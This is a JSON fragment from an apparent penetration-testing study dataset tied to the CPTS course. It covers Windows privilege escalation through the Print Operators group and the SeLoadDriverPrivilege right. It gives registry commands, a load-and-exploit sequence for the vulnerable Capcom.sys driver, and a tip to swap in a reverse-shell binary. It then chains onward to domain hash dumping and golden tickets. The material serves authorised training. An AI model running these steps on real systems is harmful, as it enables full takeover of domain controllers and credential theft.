      "primary_cert": "CPTS",
      "source": "CPTS Module 26: Windows Privilege Escalation",
      "examples": [
        {
          "label": "Point a CAPCOM registry entry at the vulnerable driver",
          "command": "reg add HKCU\\System\\CurrentControlSet\\CAPCOM /v ImagePath /t REG_SZ /d \"\\??\\C:\\Tools\\Capcom.sys\"\nreg add HKCU\\System\\CurrentControlSet\\CAPCOM /v Type /t REG_DWORD /d 1"
        },
        {
          "label": "Enable SeLoadDriverPrivilege and load the driver",
          "command": "EoPLoadDriver.exe System\\CurrentControlSet\\Capcom c:\\Tools\\Capcom.sys"
        },
        {
          "label": "Exploit the loaded Capcom driver for a SYSTEM shell",
          "command": ".\\ExploitCapcom.exe"
        },
        {
          "label": "Clean up the registry key",
          "command": "reg delete HKCU\\System\\CurrentControlSet\\Capcom"
        }
      ],
      "notes": "=== Print Operators — SeLoadDriverPrivilege → Kernel Exploit → SYSTEM ===\nPrint Operators get SeLoadDriverPrivilege — load Capcom.sys signed driver → SYSTEM on DC.\n\n=== PRIVILEGE AND REQUIREMENTS ===\nSeLoadDriverPrivilege: allows loading/unloading kernel device drivers\nPrint Operators also: manage printers on DCs + log on locally to DCs\nPrivilege is DISABLED in non-elevated context due to UAC → must bypass UAC first\nWindows 10 1803+: HKCU registry references for SeLoadDriverPrivilege are BLOCKED — technique mostly applies to older DCs\n\n=== CAPCOM.SYS ATTACK CHAIN ===\nCapcom.sys: vulnerable SIGNED driver with function to execute arbitrary shellcode as SYSTEM.\nSigned = loads without kernel code signing bypass needed.\n\nStep 1: Compile privilege enabler\n  Modify EnableSeLoadDriverPrivilege.cpp (correct Windows headers)\n  cl.exe from VS Developer Command Prompt\n\nStep 2: Register driver in HKCU registry (user-owned key — no admin needed for HKCU)\n  reg add \"HKCU\\System\\CurrentControlSet\\Capcom\" /v ImagePath /t REG_SZ /d \"\\??\\C:\\Tools\\Capcom.sys\"\n  reg add \"HKCU\\System\\CurrentControlSet\\Capcom\" /v Type /t REG_DWORD /d 1\n  \\??\\ = NT Object Path syntax required for NTLoadDriver (resolves full NT object path)\n\nStep 3: Enable privilege and load driver\n  .\\EnableSeLoadDriverPrivilege.exe\n  Verify: DriverView.exe confirms Capcom.sys in kernel\n\nStep 4: Exploit the driver\n  .\\ExploitCapcom.exe\n  → Capcom function executes shellcode → token steal from SYSTEM process → SYSTEM shell\n\n=== AUTOMATED ALTERNATIVE ===\nEoPLoadDriver.exe <HKCU_reg_path> <driver_file_path>\nConsolidates steps 2-3 into single command.\nThen run ExploitCapcom.exe.\n\n=== NO GUI MODIFICATION ===\nEdit ExploitCapcom.cpp line 292: replace \"cmd.exe\" with reverse shell binary path\nRecompile before transfer for non-interactive shell delivery\n\n=== CLEANUP ===\nreg delete \"HKCU\\System\\CurrentControlSet\\Capcom\" /f\n\n=== CHAINING CONTEXT ===\nPrint Operators → UAC bypass (UACMe or srrstr DLL) → elevated shell → Capcom → SYSTEM on DC\nSYSTEM on DC → secretsdump → domain hashes → golden ticket\nSeLoadDriverPrivilege + other vulnerable signed drivers (not just Capcom) = same result",
      "references": [
        {
          "title": "EoPLoadDriver (TarlogicSecurity)",
          "url": "https://github.com/TarlogicSecurity/EoPLoadDriver/"
        },
        {
          "title": "ExploitCapcom (tandasat)",
          "url": "https://github.com/tandasat/ExploitCapcom"
        },
        {
          "title": "HTB Academy - Windows Privilege Escalation",
          "url": "https://academy.hackthebox.com/module/details/67"
        },
        {
          "title": "OffSec PEN-200 (OSCP)",
          "url": "https://www.offsec.com/courses/pen-200/"
        }
      ],
